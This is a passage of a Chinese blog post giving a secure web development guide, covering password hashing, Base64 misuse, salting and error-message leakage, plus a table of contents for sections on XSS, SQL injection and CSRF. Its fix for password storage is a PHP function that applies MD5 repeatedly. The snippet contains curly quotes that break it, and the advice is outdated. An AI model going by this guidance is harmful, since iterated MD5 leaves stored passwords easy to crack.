+<h4 id="3-3-1-3-解决方法"><a href="#3-3-1-3-解决方法" class="headerlink" title="3.3.1.3. 解决方法"></a>3.3.1.3. 解决方法</h4><p>重要数据加密中严谨使用单次 MD5 加密。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    Function JD_md5($str,$n) </span><br><span class="line">    &#123; </span><br><span class="line">        $md5str = $str; </span><br><span class="line">        If($n&lt;3) </span><br><span class="line">        &#123; </span><br><span class="line">            return(“encrypt times less”); </span><br><span class="line">            </span><br><span class="line">        &#125;else &#123; </span><br><span class="line">        while($n) &#123; </span><br><span class="line">        $md5str = md5($md5str); </span><br><span class="line">        $n--; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        return($md5str); </span><br><span class="line">        </span><br><span class="line">    &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-4-2-BASE64-编码安全"><a href="#3-4-2-BASE64-编码安全" class="headerlink" title="3.4.2. BASE64 编码安全"></a>3.4.2. BASE64 编码安全</h3><h4 id="3-4-2-1-Base64-编码说明"><a href="#3-4-2-1-Base64-编码说明" class="headerlink" title="3.4.2.1. Base64 编码说明"></a>3.4.2.1. Base64 编码说明</h4><p>很多开发认为 base64 是加密方法，这是造成很多问题的原因，base64 设计之初是为 了字符编码，并不是加密，所以 base64 可以当作不是一眼就能看懂的明文。</p>
+<h4 id="3-4-2-2-Base64-攻击示例"><a href="#3-4-2-2-Base64-攻击示例" class="headerlink" title="3.4.2.2. Base64 攻击示例"></a>3.4.2.2. Base64 攻击示例</h4><p>当某系统使用如下连接下载，为防止用户查看下载地址，错误的使用了 base64 编码下载<br>地址，导致任意文件的下载，相关连接如下</p>
+<h4 id="3-4-2-3-解决方法"><a href="#3-4-2-3-解决方法" class="headerlink" title="3.4.2.3. 解决方法"></a>3.4.2.3. 解决方法</h4><p>对于 base64、escape、urlencode 等编码不能当作加密算法使用，在应用中禁止自己编写 加密算法，重要数据建议使用多次 MD5 加密、多次随机盐加密、或 AES 加密</p>
+<h3 id="3-4-3-随机加密算法（加盐法）"><a href="#3-4-3-随机加密算法（加盐法）" class="headerlink" title="3.4.3. 随机加密算法（加盐法）"></a>3.4.3. 随机加密算法（加盐法）</h3><h4 id="3-4-3-1-加盐法说明"><a href="#3-4-3-1-加盐法说明" class="headerlink" title="3.4.3.1. 加盐法说明"></a>3.4.3.1. 加盐法说明</h4><p>在重要数据存储时，用 MD5 加密、BASE64 编码等方式存储均存在安全较大的安全隐 患，所以对于重要数据的存储、传输建议使用随机 的加密方式。 随机函数用于加密其中方法非常多，组合法、跳变法、重排法、多模法，这里介绍一种方 法：加盐法。<br>加盐法的最大特色是增加加密强度，它是一种动态方法。经过加盐处理可以做到，即 使用同样的明文、同样的用户密码每次加密得到的密文都不一样，密码、明文、密文没有 固定的对应关系这样当然不好分析了。</p>
+<h4 id="3-4-3-2-加盐法示例"><a href="#3-4-3-2-加盐法示例" class="headerlink" title="3.4.3.2. 加盐法示例"></a>3.4.3.2. 加盐法示例</h4><h2 id="3-5-错误处理"><a href="#3-5-错误处理" class="headerlink" title="3.5. 错误处理"></a>3.5. 错误处理</h2><p>当用户提交数据不合法，或者 web 应用程序在处理某种数据出错时，会返回一些程序 异常信息，从而暴露很多对攻击者有用的信息，攻击者可以利用这些错误信息，制定下一 步攻击方案。</p>
+<h3 id="3-5-1-攻击示例"><a href="#3-5-1-攻击示例" class="headerlink" title="3.5.1. 攻击示例"></a>3.5.1. 攻击示例</h3><p>用户提交数据参数错误，导致程序报如下错误</p>
+<p>通过以上报错信息我们可以看出，服务器使用的是 struts2，当攻击者发现使用的后台 框架后，会针对后台框架进行相关的漏洞收集或挖掘</p>
+<p>通过以上报错信息，直接暴露物理路径，攻击者可以结合其他漏洞上传木马到可访问的目 录。</p>
+<h3 id="3-5-2-解决方法"><a href="#3-5-2-解决方法" class="headerlink" title="3.5.2. 解决方法"></a>3.5.2. 解决方法</h3><p>以上报错的示例，较为明显的暴露了服务器相关信息，在我们的应用中，应该对 HTTP 返回值做控制，当非 200 和 302 返回时，全部跳到指定页面。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag"># 安全</a>
+          
+            <a href="/tags/开发/" rel="tag"># 开发</a>
+          
+            <a href="/tags/code/" rel="tag"># code</a>
+          
+            <a href="/tags/安全开发/" rel="tag"># 安全开发</a>
+          
+            <a href="/tags/代码安全/" rel="tag"># 代码安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/599.html?day=20171116" rel="next" title="wordpress服务器调优">
+                <i class="fa fa-chevron-left"></i> wordpress服务器调优
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Lost Maniac" />
+            
+              <p class="site-author-name" itemprop="name">Lost Maniac</p>
+              <p class="site-description motion-element" itemprop="description">随便写写</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/rss.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/MSG-maniac" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:semowansui@vip.qq.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://qs5.org/" title="青石坞" target="_blank">青石坞</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bejson.com/" title="bejson" target="_blank">bejson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.hellojava.com/" title="HelloJava" target="_blank">HelloJava</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-客户端安全"><span class="nav-number">1.</span> <span class="nav-text">1.客户端安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-跨站脚本漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">1.1. 跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-1-跨站脚本攻击说明"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1.1. 跨站脚本攻击说明</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-1-1-存储型跨站"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">1.1.1.1. 存储型跨站</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-1-2-反射型跨站"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">1.1.1.2. 反射型跨站</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-1-3-Dom-型跨站"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">1.1.1.3. Dom 型跨站</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-2-跨站脚本示例"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.1.2. 跨站脚本示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-3-跨站脚本漏洞影响"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.1.3. 跨站脚本漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-4-HTML-跨站脚本漏洞"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.1.4. HTML 跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-4-1-解决方案"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">1.1.4.1. 解决方案</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-4-2-escapeHTML-函数参考-JAVA-代码类"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">1.1.4.2. escapeHTML 函数参考 JAVA 代码类</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-5-JavaScript-跨站脚本漏洞"><span class="nav-number">1.1.5.</span> <span class="nav-text">1.1.5. JavaScript 跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-5-1-解决方案"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">1.1.5.1. 解决方案</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-5-2-escapeJavaScript-转义函数参考代码"><span class="nav-number">1.1.5.2.</span> <span class="nav-text">1.1.5.2. escapeJavaScript 转义函数参考代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-6-JSON-跨站脚本漏洞"><span class="nav-number">1.1.6.</span> <span class="nav-text">1.1.6. JSON 跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-6-1-解决方案"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">1.1.6.1. 解决方案</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-6-2-参考代码"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">1.1.6.2. 参考代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-7-URL-跨站脚本漏洞"><span class="nav-number">1.1.7.</span> <span class="nav-text">1.1.7. URL 跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-7-1-解决方案"><span class="nav-number">1.1.7.1.</span> <span class="nav-text">1.1.7.1. 解决方案</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-7-2-参考实践代码"><span class="nav-number">1.1.7.2.</span> <span class="nav-text">1.1.7.2. 参考实践代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-8-CSS-样式跨站脚本漏洞"><span class="nav-number">1.1.8.</span> <span class="nav-text">1.1.8. CSS 样式跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-8-1-解决方案"><span class="nav-number">1.1.8.1.</span> <span class="nav-text">1.1.8.1. 解决方案</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-8-2-参考代码"><span class="nav-number">1.1.8.2.</span> <span class="nav-text">1.1.8.2. 参考代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-9-副文本跨站脚本漏洞"><span class="nav-number">1.1.9.</span> <span class="nav-text">1.1.9. 副文本跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-9-1-解决方案"><span class="nav-number">1.1.9.1.</span> <span class="nav-text">1.1.9.1. 解决方案</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-URL-跳转漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">1.2. URL 跳转漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-URL-跳转漏洞说明"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.1. URL 跳转漏洞说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-解决方案"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2.2. 解决方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-3-参考实践"><span class="nav-number">1.2.3.</span> <span class="nav-text">1.2.3. 参考实践</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-JSON-挟持漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">1.3.    JSON 挟持漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-1-JSON-挟持漏洞说明"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.3.1. JSON 挟持漏洞说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-2-JSON-挟持实例"><span class="nav-number">1.3.2.</span> <span class="nav-text">1.3.2.    JSON 挟持实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-3-JSON-挟持解决"><span class="nav-number">1.3.3.</span> <span class="nav-text">1.3.3.    JSON 挟持解决</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-4-最佳实践参考代码"><span class="nav-number">1.3.4.</span> <span class="nav-text">1.3.4. 最佳实践参考代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-XSIO-攻击"><span class="nav-number">1.4.</span> <span class="nav-text">1.4.    XSIO 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-1-XSIO-漏洞说明"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.4.1.    XSIO 漏洞说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-2-XSIO-漏洞实例"><span class="nav-number">1.4.2.</span> <span class="nav-text">1.4.2.    XSIO 漏洞实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-3-XSIO-漏洞解决"><span class="nav-number">1.4.3.</span> <span class="nav-text">1.4.3.    XSIO 漏洞解决</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-Cross-site-request-forgery（跨站请求伪造）"><span class="nav-number">1.5.</span> <span class="nav-text">1.5.    Cross-site request forgery（跨站请求伪造）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-1-CSRF-介绍"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.5.1.    CSRF 介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-2-CSRF-实例"><span class="nav-number">1.5.2.</span> <span class="nav-text">1.5.2.    CSRF 实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-3-解决方案"><span class="nav-number">1.5.3.</span> <span class="nav-text">1.5.3. 解决方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-FLASH-安全"><span class="nav-number">1.6.</span> <span class="nav-text">1.6.    FLASH 安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-1-FLASH-客户端安全"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.6.1.    FLASH 客户端安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-1-1-本地配置文件错误"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">1.6.1.1. 本地配置文件错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-1-2-客户端安全配置规范"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">1.6.1.2. 客户端安全配置规范</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-2-FLASH-服务端安全"><span class="nav-number">1.6.2.</span> <span class="nav-text">1.6.2.    FLASH 服务端安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-2-1-服务端配置错误-跨域访问"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">1.6.2.1. 服务端配置错误-跨域访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-2-2-FLASH-开发规范"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">1.6.2.2. FLASH 开发规范</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-服务端安全"><span class="nav-number">2.</span> <span class="nav-text">2. 服务端安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-SQL-注入"><span class="nav-number">2.1.</span> <span class="nav-text">2.1. SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-SQL-注入说明"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.1.1. SQL 注入说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-2-SQL-注入影响-恶意用户利用-SQL-注入可以做到："><span class="nav-number">2.1.2.</span> <span class="nav-text">2.1.2. SQL 注入影响 恶意用户利用 SQL 注入可以做到：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-3-SQL-注入示例"><span class="nav-number">2.1.3.</span> <span class="nav-text">2.1.3. SQL 注入示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-4-SQL-注入解决方法"><span class="nav-number">2.1.4.</span> <span class="nav-text">2.1.4. SQL 注入解决方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-上传漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">2.2. 上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-1-常见上传漏洞"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.2.1. 常见上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1-1-上传漏洞说明"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">2.2.1.1. 上传漏洞说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1-2-常见上传漏洞实例"><span class="nav-number">2.2.1.2.</span> <span class="nav-text">2.2.1.2. 常见上传漏洞实例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-XML-注入漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">2.4. XML 注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-1-XML-注入示例"><span class="nav-number">2.3.1.</span> <span class="nav-text">2.4.1. XML 注入示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-HTTP-协议头漏洞"><span class="nav-number">2.4.</span> <span class="nav-text">2.5. HTTP 协议头漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-1-HTTP-协议头-X-Forwarded-For-伪造漏洞"><span class="nav-number">2.4.1.</span> <span class="nav-text">2.5.1.    HTTP 协议头 X-Forwarded-For 伪造漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-1-1-X-Forwarded-For-伪造漏洞说明"><span class="nav-number">2.4.1.1.</span> <span class="nav-text">2.5.1.1.    X-Forwarded-For 伪造漏洞说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-1-2-X-Forwarded-For-伪造漏洞攻击事例"><span class="nav-number">2.4.1.2.</span> <span class="nav-text">2.5.1.2.    X-Forwarded-For 伪造漏洞攻击事例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-1-3-X-Forwarded-For-伪造漏洞解决"><span class="nav-number">2.4.1.3.</span> <span class="nav-text">2.5.1.3.    X-Forwarded-For 伪造漏洞解决</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-2-1-HTTP-响应头注入漏洞说明"><span class="nav-number">2.4.1.4.</span> <span class="nav-text">2.5.2.1. HTTP 响应头注入漏洞说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-2-2-HTTP-响应头注入漏洞攻击实例"><span class="nav-number">2.4.1.5.</span> <span class="nav-text">2.5.2.2. HTTP 响应头注入漏洞攻击实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-2-3-HTTP-响应头注入漏洞解决方案"><span class="nav-number">2.4.1.6.</span> <span class="nav-text">2.5.2.3. HTTP 响应头注入漏洞解决方案</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-6-代码注入攻击"><span class="nav-number">2.5.</span> <span class="nav-text">2.6. 代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-1-代码注入攻击说明"><span class="nav-number">2.5.1.</span> <span class="nav-text">2.6.1. 代码注入攻击说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-2-危险函数"><span class="nav-number">2.5.2.</span> <span class="nav-text">2.6.2. 危险函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-2-漏洞实例"><span class="nav-number">2.5.3.</span> <span class="nav-text">2.6.2. 漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-6-2-1-system-注入攻击"><span class="nav-number">2.5.3.1.</span> <span class="nav-text">2.6.2.1 system()注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-6-2-2-eval注入攻击"><span class="nav-number">2.5.3.2.</span> <span class="nav-text">2.6.2.2 eval注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-6-2-3-防范方法"><span class="nav-number">2.5.3.3.</span> <span class="nav-text">2.6.2.3 防范方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-7-框架安全"><span class="nav-number">2.6.</span> <span class="nav-text">2.7. 框架安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-8-权限控制"><span class="nav-number">2.7.</span> <span class="nav-text">2.8. 权限控制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-1-水平权限控制"><span class="nav-number">2.7.1.</span> <span class="nav-text">2.8.1. 水平权限控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-8-1-1-水平权限控制示例"><span class="nav-number">2.7.1.1.</span> <span class="nav-text">2.8.1.1. 水平权限控制示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-2-垂直权限控制"><span class="nav-number">2.7.2.</span> <span class="nav-text">2.8.2. 垂直权限控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-8-2-1-垂直权限控制示例"><span class="nav-number">2.7.2.1.</span> <span class="nav-text">2.8.2.1. 垂直权限控制示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-3-权限控制解决方案"><span class="nav-number">2.7.3.</span> <span class="nav-text">2.8.3. 权限控制解决方案</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-WEB-数据安全"><span class="nav-number">3.</span> <span class="nav-text">3. WEB 数据安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-HTTP-传输安全"><span class="nav-number">3.1.</span> <span class="nav-text">3.1.    HTTP 传输安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-1-HTTP-传输签名"><span class="nav-number">3.1.1.</span> <span class="nav-text">3.1.1.    HTTP 传输签名</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-1-HTTP-传输签名说明"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">3.1.1.1. HTTP 传输签名说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-2-http-传输攻击案例"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">3.1.1.2. http 传输攻击案例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-3-解决方案演示"><span class="nav-number">3.1.1.3.</span> <span class="nav-text">3.1.1.3. 解决方案演示</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-Cookie-安全"><span class="nav-number">3.2.</span> <span class="nav-text">3.2.    Cookie 安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-1-HTTP-协议-HttpOnly-属性"><span class="nav-number">3.2.1.</span> <span class="nav-text">3.2.1.    HTTP 协议 HttpOnly 属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-2-HTTP-协议-secure-属性"><span class="nav-number">3.2.2.</span> <span class="nav-text">3.2.2.    HTTP 协议 secure 属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-密码存储安全"><span class="nav-number">3.3.</span> <span class="nav-text">3.3. 密码存储安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-1-单次-MD5-加密算法问题"><span class="nav-number">3.3.1.</span> <span class="nav-text">3.3.1. 单次 MD5 加密算法问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-1-1-单次-MD5-加密算法问题说明"><span class="nav-number">3.3.1.1.</span> <span class="nav-text">3.3.1.1. 单次 MD5 加密算法问题说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-1-2-单次-MD5-加密攻击示例"><span class="nav-number">3.3.1.2.</span> <span class="nav-text">3.3.1.2. 单次 MD5 加密攻击示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-1-3-解决方法"><span class="nav-number">3.3.1.3.</span> <span class="nav-text">3.3.1.3. 解决方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-2-BASE64-编码安全"><span class="nav-number">3.3.2.</span> <span class="nav-text">3.4.2. BASE64 编码安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-2-1-Base64-编码说明"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">3.4.2.1. Base64 编码说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-2-2-Base64-攻击示例"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">3.4.2.2. Base64 攻击示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-2-3-解决方法"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">3.4.2.3. 解决方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-3-随机加密算法（加盐法）"><span class="nav-number">3.3.3.</span> <span class="nav-text">3.4.3. 随机加密算法（加盐法）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-3-1-加盐法说明"><span class="nav-number">3.3.3.1.</span> <span class="nav-text">3.4.3.1. 加盐法说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-3-2-加盐法示例"><span class="nav-number">3.3.3.2.</span> <span class="nav-text">3.4.3.2. 加盐法示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-5-错误处理"><span class="nav-number">3.4.</span> <span class="nav-text">3.5. 错误处理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a 